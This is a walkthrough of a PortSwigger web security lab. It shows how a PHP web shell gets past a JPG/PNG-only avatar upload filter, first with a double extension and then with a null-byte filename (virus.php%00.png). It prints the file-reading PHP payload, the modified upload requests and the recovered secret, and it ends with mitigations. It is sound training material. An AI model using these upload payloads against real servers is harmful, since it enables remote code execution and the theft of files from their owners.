# Web Shell Upload via Obfuscated File Extension

## 📌 Lab Overview

This lab demonstrates a **File Upload Vulnerability** caused by improper validation of uploaded file names.

The application attempted to restrict uploads to:

```text
.jpg
.png
```

files only.

However, the filename validation logic was flawed and could be bypassed using a **null byte injection** technique.

By abusing string termination behavior, it was possible to upload a PHP web shell while still satisfying the application's extension validation checks.

This lab focused on:

- File Upload Vulnerabilities
- Null Byte Injection
- Filename Obfuscation
- Extension Validation Bypass
- Web Shell Uploads
- Remote Code Execution

---

# 🔍 What is an Obfuscated File Extension?

An obfuscated file extension is a technique used to disguise a dangerous file so that it appears harmless to validation mechanisms.

Example:

```text
virus.php
```

might be blocked.

An attacker may try:

```text
virus.php.png
virus.php%00.png
virus.phtml
virus.php.jpg
```

to trick the application into accepting the file.

The goal is:

```text
Pass Upload Validation
↓
Retain Executable Extension
↓
Execute Malicious Code
```

---

# 🎯 Objective

The goal of this lab was to:

- bypass file extension validation
- upload a PHP web shell
- execute PHP code on the server
- retrieve Carlos's secret
- solve the lab

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](screenshot-upload1.png)

The application initially displayed:

- a normal webpage
- a **My Account** button

---

## Screenshot 2 — Login Page

![Screenshot 2](screenshot-upload2.png)

After clicking **My Account**, I landed on the login page.

The lab provided credentials:

```text
Username: wiener
Password: peter
```

I entered the credentials and logged in.

---

## Screenshot 3 — Avatar Upload Functionality

![Screenshot 3](screenshot-upload3.png)

After logging in as:

```text
wiener
```

I could see:

- Update Email functionality
- Avatar Upload functionality

To verify uploads worked correctly, I selected:

```text
luffy.jpg
```

and uploaded it.

---

## Screenshot 4 — Successful Image Upload

![Screenshot 4](screenshot-upload4.png)

The application responded:

```text
The file avatars/luffy.jpg has been uploaded.
```

confirming that uploads were functioning correctly.

---

## Screenshot 5 — Attempting a PHP Upload

![Screenshot 5](screenshot-upload5.png)

After returning to **My Account**, I confirmed that:

```text
luffy.jpg
```

was displayed correctly.

I then selected:

```php
virus.php
```

containing:

```php
<?php echo file_get_contents('/home/carlos/secret') ?>
```

and attempted to upload it.

---

## Screenshot 6 — Upload Rejected

![Screenshot 6](screenshot-upload6.png)

The application responded:

```text
Sorry, only JPG and PNG files are allowed.
Sorry, there was an error uploading your file.
```

This confirmed that direct PHP uploads were blocked.

---

## Screenshot 7 — Capturing the Upload Request

![Screenshot 7](screenshot-upload7.png)

I captured the upload request:

```http
POST /my-account/avatar
```

and inspected the uploaded file details:

```http
Content-Disposition: form-data;
name="avatar";
filename="virus.php"

Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret') ?>
```

The application was clearly validating the filename extension.

---

## Screenshot 8 — Testing Double Extensions

![Screenshot 8](screenshot-upload8.png)

I modified the filename:

```http
filename="virus.php.png"
```

Resulting request:

```http
Content-Disposition: form-data;
name="avatar";
filename="virus.php.png"

Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret') ?>
```

### Logic Behind This Attempt

The idea was:

```text
Application checks last extension
↓
.png appears valid
↓
Upload may be accepted
```

This is a common double-extension bypass technique.

Example:

```text
virus.php.png
```

looks like:

```text
PNG File
```

to weak validation filters.

The upload succeeded and returned:

```text
The file avatars/virus.php has been uploaded.
```

---

## Screenshot 9 — Accessing the Uploaded File

![Screenshot 9](screenshot-upload9.png)

I copied the uploaded file URL and opened it in the browser.

The page simply showed the upload confirmation message.

No PHP execution occurred yet.

---

## Screenshot 10 — Execution Failure

![Screenshot 10](screenshot-upload10.png)

After returning to the account page, the avatar appeared as a broken image.

Opening the image in a new tab resulted in:

```text
The image cannot be displayed because it contains errors.
```

The URL was:

```text
/files/avatars/virus.php.png
```

### Why Did This Fail?

The upload validation was bypassed because:

```text
Last Extension = .png
```

However, the execution logic still saw:

```text
virus.php.png
```

as a PNG file.

Apache did not execute it as PHP.

Result:

```text
Upload Bypass = Success
Execution Bypass = Failure
```

---

## Screenshot 11 — Using Null Byte Injection

![Screenshot 11](screenshot-upload11.png)

Next, I modified the filename:

```http
filename="virus.php%00.png"
```

Resulting request:

```http
Content-Disposition: form-data;
name="avatar";
filename="virus.php%00.png"

Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret') ?>
```

### Logic Behind `%00`

`%00` represents:

```text
NULL BYTE
```

which is equivalent to:

```text
\0
```

in many programming languages.

Historically, some systems processed strings like:

```text
virus.php%00.png
```

as:

```text
virus.php
```

because the null byte terminated the string.

This is called:

```text
String Termination
```

Example:

```text
virus.php%00.png
```

becomes:

```text
virus.php
```

internally.

Therefore:

```text
Validation Sees:
virus.php%00.png
↓
Allowed (.png)

Filesystem Sees:
virus.php
↓
Executable PHP File
```

This is exactly the behavior exploited in this lab.

The upload succeeded.

---

## Screenshot 12 — Opening the Uploaded Resource

![Screenshot 12](screenshot-upload12.png)

I copied the response URL and opened it in the browser.

The page again showed the upload confirmation message.

The real test would occur when accessing the actual uploaded file.

---

## Screenshot 13 — Broken Image and Not Found Error

![Screenshot 13](screenshot-upload13.png)

After returning to the account page, the avatar appeared as a broken image.

Opening it in a new tab resulted in:

```text
NOT FOUND
The requested URL was not found on this server.
```

The URL was:

```text
/files/avatars/virus.php%00.png
```

### Why Did This URL Fail?

The browser requested:

```text
virus.php%00.png
```

literally.

However, the server had actually stored:

```text
virus.php
```

after processing the null byte.

Therefore:

```text
Requested:
virus.php%00.png

Stored:
virus.php
```

Since no file named:

```text
virus.php%00.png
```

existed on disk, Apache returned:

```text
404 Not Found
```

---

## Screenshot 14 — Accessing the Real PHP File

![Screenshot 14](screenshot-upload14.png)

I modified the URL manually:

```text
/files/avatars/virus.php
```

This time the PHP code executed successfully.

The page displayed Carlos's secret:

```text
csWSGwycJvD3hBlngX433afE9WbHsROf
```

### Why Did This Work?

Because the file actually stored on the server was:

```text
virus.php
```

not:

```text
virus.php%00.png
```

Apache recognized:

```text
.php
```

and executed the file as PHP.

The uploaded web shell then executed:

```php
file_get_contents('/home/carlos/secret')
```

and revealed the secret.

---

## Screenshot 15 — Solving the Lab

![Screenshot 15](screenshot-upload15.png)

I copied the secret and submitted it through the lab banner.

The lab was successfully solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because:

- filename validation was performed incorrectly
- null byte characters were not handled safely
- upload validation and file storage logic behaved differently
- the application trusted user-controlled filenames

The resulting logic became:

```text
Validation:
virus.php%00.png
↓
Looks Safe

Filesystem:
virus.php
↓
Executable PHP File
```

---

# 💥 Impact

An attacker could potentially:

- bypass file extension restrictions
- upload web shells
- achieve Remote Code Execution
- read sensitive files
- steal credentials
- fully compromise the server

---

# 🛡 Mitigation

To prevent this issue:

- reject null byte characters entirely
- validate filenames after decoding
- use server-generated filenames
- store uploads outside the web root
- disable script execution in upload directories
- validate actual file contents instead of extensions

Example:

```text
Upload File
↓
Decode Filename
↓
Validate Extension
↓
Generate Random Filename
↓
Store Safely
```

---

# 🧠 Skills Learned

- File Upload Testing
- Null Byte Injection
- Filename Obfuscation
- Extension Validation Bypass
- Web Shell Upload Techniques
- Remote Code Execution
- Burp Suite Request Manipulation

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- Browser Developer Tools
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how improper filename validation can lead to complete server compromise.

By first testing a double-extension bypass and then exploiting a null byte injection vulnerability, I was able to upload a PHP web shell despite the application's restriction to JPG and PNG files.

Once the uploaded file was accessed directly, Apache executed the PHP code and revealed Carlos's secret.

Through this lab, I learned:

- how file extension validation works
- why double extensions sometimes fail
- how null byte injection bypasses filename filters
- how upload validation and file storage can behave differently

The lab was successfully solved by exploiting a filename validation flaw and executing a malicious PHP web shell.
